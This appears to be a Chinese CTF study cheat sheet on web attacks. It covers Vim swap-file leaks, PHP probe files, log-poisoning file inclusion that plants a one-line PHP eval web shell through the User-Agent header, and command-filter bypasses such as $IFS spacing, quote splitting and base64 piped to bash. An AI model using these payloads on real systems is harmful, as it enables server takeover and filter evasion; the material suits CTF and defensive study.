+ 在使用 Vim 编辑器时，如果编辑过程中异常退出，Vim 会生成缓存文件。这些缓存文件可以导致信息泄露，尤其是在 Web 开发环境中。要恢复缓存文件，可以访问缓存文件的 URL，例如 `/index.php.swp`

+ 一般linux网站路径都是在/var/www/html

+ **PHP探针**实际上是一种Web脚本程序，主要是用来探测虚拟空间、服务器的运行状况，而本质上是通过PHP语言)实现探测PHP服务器敏感信息的脚本文件，通常用于探测网站目录、服务器操作系统、PHP版本、数据库版本、CPU、内存、组件支持等，基本能够很全面的了解服务器的各项信息。
  
  并且探针的文件常见命名为**tz.php**

+ **日志注入**
  
  1. 使用**Wappalyzer**确认web服务器类型
     
     对于**Apache**，日志存放路径：`/var/log/apache/access.log`
     
     对于**Ngnix**，日志存放路径：`/var/log/nginx/access.log` 和 `/var/log/nginx/error.log`
  
  2. 构造payload（以Ngnix为例）：
     
         ?Get=/var/log/nginx/access.log
  
  3. 使用bp或者hackbar修改请求头，注入**一句话木马**
     
         User-Agent: <?php @eval($_POST['cmd']); ?>
  
  4. 然后使用**中国蚁剑**连接

+ 在PHP中，可以使用str_replace()函数来**替换字符串中的一些字符**。该函数**区分大小写**，并且可以对数组中的每个元素进行查找和替换，例如
  
      <?php
      echo str_replace("world", "Shanghai", "Hello world!"); // 输出: Hello Shanghai!
      ?>

+ 有**if (!preg_match ("/flag/i", $c))**

+ **bypass**
  
  1. 空格bypass
     
     1. `$IFS$9 、${IFS} 、%09(\r)`
     
     2. `<>`
     
     3. `%0a`换行符
  
  2. 多语句执行
     
     我们一般是可以通过`;`进行多语句执行的，我们也可以通过换行符`\n(%0a)`进行多语句执行。
  
  3. 通配符
     
     1. ?通配符匹配单个字母
     
     2. *通配符匹配多个字母
     
     3. [x-x]或者是{x,x,x,x}
  
  4. 单双引号
     
     1. 单引号
     
     2. 双引号
     
     3. 反斜杠
  
    以cat指令为例，假如cat被过滤了，我们可以通过`ca''t ca""t c"a"t ca\t`这样来bypass
  
  5. 编码绕过
     
     比如用base64编码
     
     echo xxxx|base64 -d|bash
  
  6. 变量赋值（拼贴）
     
     假如我们要执行指令whoami，我们可以 
     
     `a=who;b=ami;$a$b`这样就会执行whoami指令
